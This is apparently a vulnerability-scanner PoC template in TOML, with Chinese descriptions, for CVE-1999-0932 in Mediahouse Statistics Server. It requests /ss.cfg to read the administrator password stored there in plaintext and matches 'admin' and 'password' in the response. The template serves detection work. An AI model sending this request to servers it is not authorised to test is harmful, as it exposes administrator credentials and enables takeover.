[info]
author = "ave"
description = "检测 Mediahouse Statistics Server 的 ss.cfg 配置文件是否可被远程读取，该文件以明文存储管理员密码。攻击者可通过直接请求 /ss.cfg 路径获取管理员凭据。"
id = "POC-AVE-1999-0731"
name = "Mediahouse Statistics Server 管理员密码明文读取 PoC"
severity = "high"
tags = ["ave-1999-0731"]
vuln_id = [
    "CVE-1999-0932",
    "AVE-1999-0731",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/ss.cfg"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "admin",
    "password",
    "ss.cfg",
]
